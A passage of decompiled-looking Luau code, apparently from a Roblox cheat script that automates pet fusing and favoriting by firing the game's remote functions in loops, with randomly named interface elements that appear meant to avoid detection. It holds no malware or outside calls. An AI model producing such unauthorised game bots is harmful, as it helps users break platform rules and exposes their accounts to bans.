					if flag279 then
						local str18 = tostring(rarity.DisplayName or rarity._id or flag279)
						tbl165[flag279] = tbl165[flag279] or str18

						table.insert(tbl166, {
							Category = tostring(k),
							Name = tostring(value197.DisplayName or k),
							Rarity = flag279,
							RarityName = str18,
						})
					end
				end
			end

			local tbl167 = {}

			for k in pairs(tbl165) do
				table.insert(tbl167, k)
			end

			table.sort(tbl167)

			for _, item66 in ipairs(tbl167) do
				local formatted7 = string.format("%d - %s", item66, tbl165[item66])
				table.insert(list27, formatted7)
				tbl162[formatted7] = item66
			end

			table.sort(tbl166, function(param135, param136)
				if param135.Rarity ~= param136.Rarity then
					return param135.Rarity < param136.Rarity
				end
				return param135.Name < param136.Name
			end)

			for _, item67 in ipairs(tbl166) do
				local formatted8 = string.format("%s [%s]", item67.Name, item67.RarityName)

				if tbl164[formatted8] then
					formatted8 = string.format("%s [%s] (%s)", item67.Name, item67.RarityName, item67.Category)
				end

				table.insert(tbl163, formatted8)
				tbl164[formatted8] = item67.Category
			end
		end

		local value198

		do
			local func201, flag280, flag281, flag282, n24, tbl168, flag283, flag284, flag285, n25
			local n26, n27, tbl169, func202, func203, func204, func205, func206, func207

			do
				func201 = function(param137)
					for _, item68 in ipairs(list27) do
						if tbl162[item68] == param137 then
							return item68
						end
					end

					return list27[#list27]
				end

				value198 = nil
				flag280 = nil
				flag281 = tbl160[1]
				flag282 = tbl161[1]
				n24 = 6
				tbl168 = {}
				flag283 = true
				flag284 = true
				flag285 = false
				n25 = 0
				n26 = 0
				n27 = 0
				tbl169 = {}

				func202 = function(childName8, flag286)
					local obj36 = networking:FindFirstChild(childName8)
					if not obj36 or not obj36:IsA("RemoteFunction") then
						return false, nil
					end

					if flag286 == nil then
						return pcall(obj36.InvokeServer, obj36)
					end
					return pcall(obj36.InvokeServer, obj36, flag286)
				end

				func203 = function()
					local save4 = tbl1.Save
					if type(save4) ~= "table" or type(save4.Get) ~= "function" then
						return nil
					end
					local ok, result = pcall(save4.Get)
					return ok and type(result) == "table" and result or nil
				end

				local function func208(param138)
					local directory = tbl1.Assets and tbl1.Assets.Directory
					return type(directory) == "table" and directory[tostring(param138)] or nil
				end

				local function func209(param139)
					local value199 = func208(param139)
					local rarity = type(value199) == "table" and value199.Rarity or nil
					local flag287 = type(rarity) == "table"

					if flag287 then
						flag287 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					return flag287 or math.huge
				end

				func204 = function(param140)
					local value200 = func208(param140)
					return tostring(type(value200) == "table" and value200.DisplayName or param140)
				end

				local function func210(param141)
					local category4 = func208(param141.Category)
					local n28 = type(category4) == "table" and tonumber(category4.EarningRate) or 0
					local n29 = tonumber(param141.Scale) or 0
					if n28 <= 0 or n29 <= 0 then
						return 0
					end
					local n30 = n29 > 5 and (n29 / 5) ^ 1.2 * 19.637875755794113 or n29 ^ 1.85
					local mutations = tbl1.Mutations
					local flag288 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
					local n31 = 1

					if flag288 then
						local ok
						ok, n31 = pcall(mutations.EarningsFor, type(param141.Mutations) == "table" and param141.Mutations or {})
						local flag289 = ok and type(n31) == "number"
						local n32 = 1

						if not flag289 then
							n31 = n32
						end
					end

					return n28 * n30 * n31
				end

				local function func211(param142)
					return type(param142) == "table" and next(param142) ~= nil
				end

				func205 = function(param143)
					local n28 = tonumber(param143) or 0
					local tbl170 = { "", "K", "M", "B", "T", "Qa", "Qi" }
					local n29 = 1

					while math.abs(n28) >= 1000 and n29 < #tbl170 do
						n28 /= 1000
						n29 += 1
					end

					return string.format(n29 == 1 and "$%.0f%s" or "$%.2f%s", n28, tbl170[n29])
				end

				func206 = function(param144)
					local fuseKernel = tbl1.FuseKernel
					if type(fuseKernel) ~= "table" or type(fuseKernel.PriceFor) ~= "function" then
						return nil
					end
					local ok, result = pcall(fuseKernel.PriceFor, param144)
					return ok and tonumber(result) or nil
				end

				local function func212(param145, param146, tbl171)
					local flag290 = type(param146) == "table" and param146.IsFavorite ~= true and not tbl171[param145] and func209(param146.Category) <= n24 and (next(tbl168) == nil or tbl168[tostring(param146.Category)] == true)

					if flag290 then
						flag290 = not (flag283 and func211(param146.Mutations))
					end

					if flag290 then
						flag290 = (tbl169[param145] or 0) <= os.clock()
					end

					return flag290
				end

				func207 = function(param147)
					local inventory = type(param147.Inventory) == "table" and param147.Inventory or {}
					local tbl172 = {}
					local func213 = pairs
					local equippedAssets = param147.EquippedAssets or {}

					for _, equippedAsset in func213(equippedAssets) do
						tbl172[equippedAsset] = true
					end

					local tbl173 = {}
					local tbl174 = {}

					for i = 1, 3 do
						local fusionSlots2 = type(param147.FusionSlots) == "table" and param147.FusionSlots[i] or nil

						if fusionSlots2 ~= nil and type(inventory[fusionSlots2]) == "table" then
							table.insert(tbl173, fusionSlots2)
							tbl174[fusionSlots2] = true
						end
					end

					local tbl175 = {}

					for k, value201 in pairs(inventory) do
						if not tbl174[k] and type(value201) == "table" and value201.InFuse ~= true and func212(k, value201, tbl172) then
							local category5 = tostring(value201.Category)
							tbl175[category5] = tbl175[category5] or {}
							table.insert(tbl175[category5], { Uid = k, Item = value201, Income = func210(value201) })
						end
					end

					local function func214(param148)
						table.sort(param148, function(param149, param150)
							if param149.Income ~= param150.Income then
								if flag282 == tbl161[2] then
									return param149.Income > param150.Income
								end
								return param149.Income < param150.Income
							end

							return tostring(param149.Uid) < tostring(param150.Uid)
						end)
					end

					if #tbl173 > 0 then
						local str19 = tostring(inventory[tbl173[1]].Category)
						local flag291 = true

						for _, item69 in ipairs(tbl173) do
							local entry9 = inventory[item69]

							if tostring(entry9.Category) ~= str19 or not func212(item69, entry9, tbl172) then
								flag291 = false
							end
						end

						local list28 = tbl175[str19] or {}

						if flag291 and #tbl173 + #list28 >= 3 then
							func214(list28)
							local tbl176 = { Category = str19, Load = {}, Items = {} }

							for _, item70 in ipairs(tbl173) do
								table.insert(tbl176.Items, inventory[item70])
							end

							for i = 1, 3 - #tbl173 do
								table.insert(tbl176.Load, list28[i].Uid)
								table.insert(tbl176.Items, list28[i].Item)
							end

							return tbl176
						end

						if flag284 then
							return { Category = str19, Eject = tbl173 }
						end
						return nil, "Machine holds pets that cannot finish a fuse"
					end

					local value202 = nil
					local value203 = nil

					for k, value204 in pairs(tbl175) do
						if #value204 >= 3 then
							local num81 = func209(k)
							local n28 = 0

							for _, item71 in ipairs(value204) do
								n28 += item71.Income
							end

							local tbl177

							if flag281 == tbl160[2] then
								tbl177 = { -num81, -#value204 }
							elseif flag281 == tbl160[3] then
								tbl177 = { -#value204, num81 }
							elseif flag281 == tbl160[4] then
								tbl177 = { n28 / #value204, num81 }
							else
								tbl177 = { num81, -#value204 }
							end

							if value202 == nil or tbl177[1] < value202[1] or tbl177[1] == value202[1] and (tbl177[2] < value202[2] or tbl177[2] == value202[2] and k < value203) then
								value202 = tbl177
								value203 = k
							end
						end
					end

					if not value203 then
						return nil, "No three matching pets"
					end
					local entry10 = tbl175[value203]
					func214(entry10)
					local tbl178 = { Category = value203, Load = {}, Items = {} }

					for i = 1, 3 do
						table.insert(tbl178.Load, entry10[i].Uid)
						table.insert(tbl178.Items, entry10[i].Item)
					end

					return tbl178
				end
			end

			local function func215(flag292)
				local result36 = func203()
				if not result36 then
					return
				end

				if result36.FusionLocked == true then
					if type(result36.FusionEggReward) == "table" and os.clock() >= n27 then
						n27 = os.clock() + n22
						func202("RF/Fusery/FinishReveal")
					end

					return
				end

				local flag293 = func207(result36)
				if not flag293 then
					return
				end

				if flag293.Eject then
					for _, item72 in ipairs(flag293.Eject) do
						if flag292 ~= n25 then
							return
						end
						func202("RF/Fusery/EjectPet", item72)
						task.wait(0.35)
					end

					return
				end

				local items2 = func206(flag293.Items)
				local money = tonumber(result36.Money)
				if items2 and money and money < items2 then
					return
				end

				for _, item73 in ipairs(flag293.Load) do
					if flag292 ~= n25 then
						return
					end
					local LoadPet, flag294 = func202("RF/Fusery/LoadPet", item73)
					if not LoadPet or flag294 == false then
						tbl169[item73] = os.clock() + n23
						return
					end
					task.wait(0.35)
				end

				if flag292 ~= n25 then
					return
				end
				local BeginFuse, flag295 = func202("RF/Fusery/BeginFuse")

				if BeginFuse and flag295 ~= false then
					n27 = os.clock() + n22
				end
			end

			local function func216(flag296)
				if not flag296 then
					return "Fuse status unknown"
				end

				if flag296.FusionLocked == true then
					return "Machine is fusing, waiting for the egg"
				end
				local list29, flag297 = func207(flag296)
				if not list29 then
					return flag297 or "No three matching pets"
				end

				if list29.Eject then
					return string.format("Would eject %d %s that cannot finish a fuse", #list29.Eject, func204(list29.Category))
				end
				local items3 = func206(list29.Items)
				local money2 = tonumber(flag296.Money)
				local str20 = items3 and money2 and money2 < items3 and "  (not enough money)" or ""
				return string.format("Next fuse  -  3 %s for %s%s", func204(list29.Category), items3 and func205(items3) or "?", str20)
			end

			tbl2.Add(function()
				local result37 = func203()

				if flag280 and type(flag280.Set) == "function" then
					pcall(flag280.Set, flag280, func216(result37))
				end

				if not str1.Toggle(value198, false) or flag285 or os.clock() < n26 then
					return false
				end
				flag285 = true
				n26 = os.clock() + n21
				local value205 = n25

				task.spawn(function()
					pcall(func215, value205)
					flag285 = false
					tbl2.Wake()
				end)

				return false
			end)

			flag280 = obj14:CreateText({ Name = "Fuse Preview", Text = "Fuse status unknown" })

			value198 = obj14:CreateToggle({
				Name = "Auto Fuse Machine",
				Note = "Fuse 3 same pets into an egg, nonstop",
				Default = false,
				Callback = function()
					n25 += 1
					table.clear(tbl169)
					n26 = 0
					tbl2.Wake()
				end,
			})

			obj14:CreateDropdown({
				Name = "Fuse Priority Mode",
				Options = tbl160,
				Default = tbl160[1],
				SubOf = value198,
				Callback = function(value)
					if table.find(tbl160, value) then
						flag281 = value
						tbl2.Wake()
					end
				end,
			})

			obj14:CreateDropdown({
				Name = "Pets To Use",
				Options = tbl161,
				Default = tbl161[1],
				SubOf = value198,
				Callback = function(value)
					if table.find(tbl161, value) then
						flag282 = value
						tbl2.Wake()
					end
				end,
			})

			obj14:CreateDropdown({
				Name = "Max Rarity to Fuse",
				Options = list27,
				Default = func201(6),
				SubOf = value198,
				Callback = function(value)
					n24 = tbl162[value] or n24
					tbl2.Wake()
				end,
			})

			func6(obj14:CreateMultiDropdown({
				Name = "Specific Species to Fuse",
				Note = "Only fuse these species (empty = all)",
				Options = tbl163,
				Default = {},
				SubOf = value198,
				Callback = function(value)
					local tbl179 = {}

					if type(value) == "table" then
						for k, value206 in pairs(value) do
							k = value206 == true and type(k) == "string" and k or type(value206) == "string" and value206 or nil

							if k and tbl164[k] then
								tbl179[tbl164[k]] = true
							end
						end
					end

					tbl168 = tbl179
					tbl2.Wake()
				end,
			}))

			local value207 = nil

			value207 = obj14:CreateToggle({
				Name = "Skip Mutated Pets",
				Default = true,
				SubOf = value198,
				Callback = function()
					flag283 = str1.Toggle(value207, true)
					tbl2.Wake()
				end,
			})

			local value208 = nil

			value208 = obj14:CreateToggle({
				Name = "Eject Incomplete Slots",
				Note = "Take out pets that can't make a set",
				Default = true,
				SubOf = value198,
				Callback = function()
					flag284 = str1.Toggle(value208, true)
					tbl2.Wake()
				end,
			})
		end

		local save4 = tbl1.Save

		if type(save4) == "table" and type(save4.FieldSignal) == "function" then
			for _, item74 in ipairs({
				"Inventory",
				"EquippedAssets",
				"FusionSlots",
				"FusionLocked",
				"FusionEggReward",
				"Money",
			}) do
				local ok, result = pcall(save4.FieldSignal, item74)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl2.Wake()
					end)

					if ok2 and result2 then
						func4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		n2 = 2
		n3 = 25
		n4 = 4
		tbl9 = { "Match Any", "Match All" }

		do
			local tbl180 = { "Golden", "Silver", "Rainbow", "Boss", "Monstrous", "Sakura", "GreatBloom" }
			str2 = "Any Mutation"
			tbl10 = { "Off" }
			tbl11 = {}
			tbl12 = {}
			tbl13 = {}
			tbl14 = { "Any Mutation" }
			tbl15 = {}
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local tbl181 = {}
			local tbl182 = {}

			if type(directory) == "table" then
				for k, value209 in pairs(directory) do
					local rarity = type(value209) == "table" and value209.Rarity or nil
					local flag298 = type(rarity) == "table"
					local flag299

					if flag298 then
						flag299 = tonumber(rarity.RarityNumber or rarity.Rank)
					else
						flag299 = flag298
					end

					flag299 = flag299 or nil

					if flag299 then
						local str21 = tostring(rarity.DisplayName or rarity._id or flag299)
						tbl181[flag299] = tbl181[flag299] or str21

						table.insert(tbl182, {
							Category = tostring(k),
							Name = tostring(value209.DisplayName or k),
							Rarity = flag299,
							RarityName = str21,
						})
					end
				end
			end

			local tbl183 = {}

			for k in pairs(tbl181) do
				table.insert(tbl183, k)
			end

			table.sort(tbl183)

			for _, item75 in ipairs(tbl183) do
				local formatted9 = string.format("%d - %s", item75, tbl181[item75])
				table.insert(tbl10, formatted9)
				tbl11[formatted9] = item75
			end

			table.sort(tbl182, function(param151, param152)
				if param151.Rarity ~= param152.Rarity then
					return param151.Rarity < param152.Rarity
				end
				return param151.Name < param152.Name
			end)

			for _, item76 in ipairs(tbl182) do
				local formatted10 = string.format("%s [%s]", item76.Name, item76.RarityName)

				if tbl13[formatted10] then
					formatted10 = string.format("%s [%s] (%s)", item76.Name, item76.RarityName, item76.Category)
				end

				table.insert(tbl12, formatted10)
				tbl13[formatted10] = item76.Category
			end

			local tbl184 = {}
			local mutations = tbl1.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(tbl184, tostring(k))
				end
			end

			if #tbl184 == 0 then
				tbl184 = table.clone(tbl180)
			end

			table.sort(tbl184, function(param153, param154)
				return func7(param153) < func7(param154)
			end)

			for _, item77 in ipairs(tbl184) do
				local value210 = func7(item77)
				table.insert(tbl14, value210)
				tbl15[value210] = item77
			end
		end
	end

	do
		local value211 = nil
		local value212 = nil
		local value213 = nil
		local createText = nil
		local second4 = tbl9[2]
		local value214 = nil
		local flag300 = false
		local tbl185 = {}
		local n5 = 0
		local tbl186 = {}
		local flag301 = false
		local n6 = 0
		local tbl187 = {}

		local function func217()
			local save = tbl1.Save
			if type(save) ~= "table" or type(save.Get) ~= "function" then
				return nil
			end
			local ok, result = pcall(save.Get)
			return ok and type(result) == "table" and result or nil
		end

		local function func218(param155)
			local directory = tbl1.Assets and tbl1.Assets.Directory
			return type(directory) == "table" and directory[tostring(param155)] or nil
		end

		local function func219(param156)
			local value215 = func218(param156)
			local rarity = type(value215) == "table" and value215.Rarity or nil
			local flag302 = type(rarity) == "table"

			if flag302 then
				flag302 = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			return flag302 or 0
		end

		local function func220(param157)
			local category6 = func218(param157.Category)
			local n7 = type(category6) == "table" and tonumber(category6.EarningRate) or 0
			local n8 = tonumber(param157.Scale) or 0
			if n7 <= 0 or n8 <= 0 then
				return 0
			end
			local n9 = n8 > 5 and (n8 / 5) ^ 1.2 * 19.637875755794113 or n8 ^ 1.85
			local mutations = tbl1.Mutations
			local flag303 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
			local n10 = 1

			if flag303 then
				local ok
				ok, n10 = pcall(mutations.EarningsFor, type(param157.Mutations) == "table" and param157.Mutations or {})
				ok = ok and type(n10) == "number"
				local n11 = 1

				if not ok then
					n10 = n11
				end
			end

			return n7 * n9 * n10
		end

		local function func221(list30)
			local tbl188 = {}

			if type(list30.Mutations) == "table" then
				for k, mutation in pairs(list30.Mutations) do
					if type(mutation) == "string" then
						tbl188[mutation] = true
					elseif mutation == true and type(k) == "string" then
						tbl188[k] = true
					end
				end
			end

			if type(list30.BaseMutation) == "string" and list30.BaseMutation ~= "" then
				tbl188[list30.BaseMutation] = true
			end

			return tbl188
		end

		local function func222(param158)
			if tbl186[tostring(param158.Category)] then
				return true
			end
			local n7 = 0
			local n8 = 0

			if value214 then
				n7 = 1

				if value214 <= func219(param158.Category) then
					n8 = 1
				end
			end

			if flag300 or next(tbl185) ~= nil then
				n7 += 1
				local value216 = func221(param158)

				if flag300 and next(value216) ~= nil then
					n8 += 1
				else
					local flag304 = false

					for k in pairs(value216) do
						if tbl185[k] then
							flag304 = true
							break
						end
					end

					if flag304 then
						n8 += 1
					end
				end
			end

			if n5 > 0 then
				n7 += 1

				if func220(param158) >= n5 then
					n8 += 1
				end
			end

			if n7 == 0 then
				return false
			end

			if second4 == tbl9[2] then
				return n8 == n7
			end
			return n8 > 0
		end

		local function func223(param159)
			return (tbl187[param159] or 0) > os.clock()
		end

		local function func224(list31)
			local tbl189 = {}
			local value217, value218, value219 = pairs(list31.Inventory or {})
			local n7 = 0

			for k, value220 in value217, value218, value219 do
				if type(value220) == "table" and func222(value220) then
					n7 += 1

					if value220.IsFavorite ~= true and not func223(k) then
						table.insert(tbl189, k)
					end
				end
			end

			return tbl189, n7
		end

		local function func225(param160, param161, flag305)
			local tbl190 = {}
			local inventory = param160.Inventory or {}
			local func226 = pairs
			local equippedAssets = param160.EquippedAssets or {}

			for _, equippedAsset in func226(equippedAssets) do
				local entry11 = inventory[equippedAsset]

				if type(entry11) == "table" and not func223(equippedAsset) then
					if param161 then
						if entry11.IsFavorite ~= true then
							table.insert(tbl190, equippedAsset)
						end
					else
						local isFavorite = entry11.IsFavorite == true

						if isFavorite then
							isFavorite = not (flag305 and func222(entry11))
						end

						if isFavorite then
							table.insert(tbl190, equippedAsset)
						end
					end
				end
			end

			return tbl190
		end

		local function func227(list32, param162)
			local rePetSatchelWriteFavourite = networking:FindFirstChild("RE/PetSatchel/WriteFavourite")
			if not rePetSatchelWriteFavourite or not rePetSatchelWriteFavourite:IsA("RemoteEvent") then
				return
			end

			for i, item78 in ipairs(list32) do
				if not (n3 < i) then
					tbl187[item78] = os.clock() + n4
					pcall(rePetSatchelWriteFavourite.FireServer, rePetSatchelWriteFavourite, item78, param162)
					task.wait(0.12)
					continue
				end

				break
			end
		end

		local function func228(list33, param163)
			local value221 = flag301
			local flag306

			if flag301 then
				flag306 = value221
			else
				flag306 = #list33 == 0
			end

			if flag306 then
				return false
			end
			flag301 = true
			n6 = os.clock() + n2

			task.spawn(function()
				pcall(func227, list33, param163)
				flag301 = false
				tbl2.Wake()
			end)

			return true
		end

		tbl2.Add(function()
			local result38 = func217()
			if not result38 then
				return false
			end
			local flag307 = str1.Toggle(value211, false)
			local list34, value222 = func224(result38)

			if createText and type(createText.Set) == "function" then
				local func229 = pairs
				local inventory = result38.Inventory or {}
				local n7 = 0

				for _, value223 in func229(inventory) do
					if type(value223) == "table" and value223.IsFavorite == true then
						n7 += 1
					end
				end

				pcall(createText.Set, createText, string.format("Favorite matches  -  %d pets, %d to mark  |  %d favorited", value222, #list34, n7))
			end

			if flag301 or os.clock() < n6 then
				return false
			end

			if flag307 and func228(list34, true) then
				return false
			end

			if str1.Toggle(value212, false) then
				if func228(func225(result38, true, false), true) then
					return false
				end
			elseif str1.Toggle(value213, false) then
				func228(func225(result38, false, flag307), false)
			end

			return false
		end)

		createText = obj4.CreateText
		createText = createText(obj4, { Name = "Favorite Preview", Text = "Favorite matches  -  0 pets" })

		value211 = obj4:CreateToggle({
			Name = "Auto Favorite Pet",
			Note = "Favorite pets matching the rules below",
			Default = false,
			Callback = function()
				table.clear(tbl187)
				tbl2.Wake()
			end,
		})

		obj4:CreateButton({
			Name = "Favorite Pets Now",
			Note = "Favorite matching pets once",
			ButtonText = "Favorite",
			ConfirmText = "Done!",
			SubOf = value211,
			Callback = function()
				local result39 = func217()

				if result39 then
					func228(func224(result39), true)
				end
			end,
		})

		obj4:CreateDropdown({
			Name = "Favorite Rule",
			Note = "Pass any check or all checks",
			Options = tbl9,
			Default = tbl9[2],
			SubOf = value211,
			Callback = function(value)
				if table.find(tbl9, value) then
					second4 = value
					tbl2.Wake()
				end
			end,
		})

		obj4:CreateDropdown({
			Name = "Favorite Min Rarity",
			Note = "Favorite pets of the chosen rarity and every rarity above it (Off = skip)",
			Options = tbl10,
			Default = "Off",
			SubOf = value211,
			Callback = function(value)
				value214 = tbl11[value]
				tbl2.Wake()
			end,
		})

		func6(obj4:CreateMultiDropdown({
			Name = "Favorite Mutations",
			Note = "Mutation check (empty = skip)",
			Options = tbl14,
			Default = {},
			SubOf = value211,
			Callback = function(value)
				local tbl191 = {}
				local flag308 = false

				if type(value) == "table" then
					for k, value224 in pairs(value) do
						k = value224 == true and type(k) == "string" and k

						if k then
							value224 = k
						else
							value224 = type(value224) == "string" and value224
						end

						value224 = value224 or nil

						if value224 == str2 then
							flag308 = true
						elseif value224 then
							value224 = tbl15[value224] or value224
							tbl191[value224] = true
						end
					end
				end

				flag300 = flag308
				tbl185 = tbl191
				tbl2.Wake()
			end,
		}))

		local tbl192 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
		}

		local n7 = 0
		local str22 = "M/s"

		local function func230(flag309, flag310)
			if flag309 ~= nil then
				n7 = math.max(0, math.floor(tonumber(flag309) or n7))
			end

			if flag310 ~= nil then
				str22 = tostring(flag310)
			end

			n5 = n7 * (tbl192[str22] or tbl192["M/s"]).Mult
			tbl2.Wake()
		end

		func5(obj4, {
			Name = "Min Favorite Value",
			Note = "Value check (0 = skip)",
			SubOf = value211,
			Legacy = "Favorite Min Value",
			SectionName = "Auto Favorite",
			OnRaw = function(num82)
				func230(math.floor(num82 / 1000), "K/s")
			end,
		})

		func6(obj4:CreateMultiDropdown({
			Name = "Always Favorite Species",
			Note = "Always favorite these species",
			Options = tbl12,
			Default = {},
			SubOf = value211,
			Callback = function(value)
				local tbl193 = {}

				if type(value) == "table" then
					for k, value225 in pairs(value) do
						k = value225 == true and type(k) == "string" and k or type(value225) == "string" and value225
						local flag311 = k or nil

						if flag311 and tbl13[flag311] then
							tbl193[tbl13[flag311]] = true
						end
					end
				end

				tbl186 = tbl193
				tbl2.Wake()
			end,
		}))

		value212 = obj4:CreateToggle({
			Name = "Auto Favorite Equipped",
			Note = "Keep equipped pets favorited",
			Default = false,
			Callback = function()
				tbl2.Wake()
			end,
		})

		value213 = obj4:CreateToggle({
			Name = "Auto Unfavorite Equipped",
			Note = "Unfavorite equipped pets not in the rules",
			Default = false,
			Callback = function()
				tbl2.Wake()
			end,
		})

		obj4:CreateButton({
			Name = "Favorite Equipped Now",
			Note = "Favorite all equipped pets once",
			ButtonText = "Favorite",
			ConfirmText = "Done!",
			Callback = function()
				local result40 = func217()

				if result40 then
					func228(func225(result40, true, false), true)
				end
			end,
		})

		obj4:CreateButton({
			Name = "Unfavorite Equipped Now",
			Note = "Unfavorite all equipped pets once",
			ButtonText = "Unfavorite",
			ConfirmText = "Done!",
			Callback = function()
				local result41 = func217()

				if result41 then
					func228(func225(result41, false, false), false)
				end
			end,
		})
	end

	local save = tbl1.Save

	if type(save) == "table" and type(save.FieldSignal) == "function" then
		for _, item79 in ipairs({ "Inventory", "EquippedAssets" }) do
			local ok, result = pcall(save.FieldSignal, item79)

			if ok and type(result) == "table" and type(result.Connect) == "function" then
				local ok2, result2 = pcall(result.Connect, result, function()
					tbl2.Wake()
				end)

				if ok2 and result2 then
					func4(function()
						pcall(function()
							result2:Disconnect()
						end)
					end)
				end
			end
		end
	end

	local function func231()
		local tbl194 = {}

		local function func232(param164)
			local entry12 = tbl194[param164]
			if type(entry12) ~= "string" then
				return ""
			end
			return entry12
		end

		local function func233(param165, text)
			param165.AutoLocalize = false
			param165.Text = text
		end

		local n5 = 0
		local value226 = nil

		local function func234()
			if not value226 then
				return
			end

			for _, item80 in ipairs(value226) do
				func233(item80[1], func232(item80[2]))
			end
		end

		local connection = UserInputService.InputBegan:Connect(function(input)
			local userInputType = input.UserInputType

			if userInputType == Enum.UserInputType.MouseButton1 or userInputType == Enum.UserInputType.Touch or userInputType == Enum.UserInputType.Keyboard or userInputType == Enum.UserInputType.Gamepad1 then
				n5 = os.clock()
			end
		end)

		func4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		local function manual()
			return os.clock() - n5 <= 1
		end

		local screenGui = nil
		local uiScale = nil
		local list35 = {}
		local value227 = nil
		local value228 = nil

		local function func235()
			if not uiScale then
				return
			end
			local currentCamera = workspace.CurrentCamera
			currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

			if currentCamera.X < 1 then
				currentCamera = Vector2.new(1280, 720)
			end

			uiScale.Scale = math.clamp(math.min(currentCamera.X / 1280, currentCamera.Y / 720), 0.72, 1.35)
		end

		local function hide()
			if screenGui then
				screenGui.Enabled = false
			end
		end

		local font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
		local colorSequence = ColorSequence.new
		local value229 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
		local value230 = ColorSequenceKeypoint.new(0.486, Color3.fromRGB(255, 255, 255))
		local value231 = ColorSequenceKeypoint.new(0.519, Color3.fromRGB(221, 221, 221))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		local tbl195 = { value229, value230, value231 }

		do
			local values = table.pack(new(1, color(236, 236, 236)))
			table.move(values, 1, values.n, 4, tbl195)
		end

		local value232 = colorSequence(tbl195)
		local new2 = ColorSequenceKeypoint.new
		local color2 = Color3.fromRGB
		local colorSequence2 = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 36, 84)), new2(1, color2(0, 31, 54)) })
		local colorSequence3 = ColorSequence.new
		local value233 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 193, 194))
		local value234 = ColorSequenceKeypoint.new(0.057, Color3.fromRGB(255, 132, 123))
		local new3 = ColorSequenceKeypoint.new
		local color3 = Color3.fromRGB
		local tbl196 = { value233, value234 }

		do
			local values = table.pack(new3(1, color3(239, 28, 28)))
			table.move(values, 1, values.n, 3, tbl196)
		end

		local flag312 = colorSequence3(tbl196)
		local colorSequence4 = ColorSequence.new
		local value235 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 193, 194))
		local value236 = ColorSequenceKeypoint.new(0.015, Color3.fromRGB(255, 132, 123))
		local new4 = ColorSequenceKeypoint.new
		local color4 = Color3.fromRGB
		local tbl197 = { value235, value236 }

		do
			local values = table.pack(new4(1, color4(239, 28, 28)))
			table.move(values, 1, values.n, 3, tbl197)
		end

		local flag313 = colorSequence4(tbl197)
		local colorSequence5 = ColorSequence.new
		local value237 = ColorSequenceKeypoint.new(0, Color3.fromRGB(92, 94, 106))
		local value238 = ColorSequenceKeypoint.new(0.057, Color3.fromRGB(70, 71, 82))
		local new5 = ColorSequenceKeypoint.new
		local color5 = Color3.fromRGB
		local tbl198 = { value237, value238 }

		do
			local values = table.pack(new5(1, color5(38, 39, 46)))
			table.move(values, 1, values.n, 3, tbl198)
		end

		local value239 = colorSequence5(tbl198)

		local function createUIStroke(parent, applyStrokeMode, thickness, color6)
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = func3()
			uiStroke.ApplyStrokeMode = applyStrokeMode
			uiStroke.Color = color6 or Color3.fromRGB(0, 0, 0)
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Thickness = thickness
			uiStroke.Transparency = 0
			uiStroke.Parent = parent
			return uiStroke
		end

		local function createUIGradient(parent, color6, rotation)
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Name = func3()
			uiGradient.Color = color6
			uiGradient.Rotation = rotation or 90
			uiGradient.Parent = parent
			return uiGradient
		end

		local function createUIStroke2(parent, textSize)
			parent.FontFace = font
			parent.TextColor3 = Color3.fromRGB(255, 255, 255)
			parent.TextStrokeTransparency = 1
			parent.TextSize = textSize
			parent.LineHeight = 1
			local uiStroke = Instance.new("UIStroke")
			uiStroke.Name = func3()
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.Color = Color3.fromRGB(0, 0, 0)
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Thickness = math.max(1, textSize * 0.08)
			uiStroke.Transparency = 0
			uiStroke.Parent = parent
			return uiStroke
		end

		local function func236(param166, num83)
			local uIStroke2 = createUIStroke2(param166, num83)
			createUIGradient(uIStroke2, colorSequence2, 90)
			createUIGradient(param166, value232, 90)
			uIStroke2.Thickness = math.max(1, num83 * 0.065)
		end

		local function func237()
			if screenGui then
				return
			end
			screenGui = Instance.new("ScreenGui")
			screenGui.Name = func3()
			screenGui.DisplayOrder = 2e9
			screenGui.IgnoreGuiInset = true
			screenGui.ResetOnSpawn = false
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.Enabled = false
			local textButton = Instance.new("TextButton")
			textButton.Name = func3()
			textButton.AutoButtonColor = false
			textButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			textButton.BackgroundTransparency = 0.45
			textButton.BorderSizePixel = 0
			textButton.Modal = true
			textButton.Size = UDim2.fromScale(1, 1)
			textButton.Text = ""
			textButton.ZIndex = 1
			textButton.Parent = screenGui
			local frame = Instance.new("Frame")
			frame.Name = func3()
			frame.Active = true
			frame.AnchorPoint = Vector2.new(0.5, 0.5)
			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			frame.BackgroundTransparency = 0.18
			frame.Position = UDim2.fromScale(0.5, 0.5)
			frame.Size = UDim2.fromOffset(430, 316)
			frame.ZIndex = 10
			frame.Parent = screenGui
			uiScale = Instance.new("UIScale")
			uiScale.Name = func3()
			uiScale.Parent = frame
			createUIStroke(frame, Enum.ApplyStrokeMode.Border, 2)
			local frame2 = Instance.new("Frame")
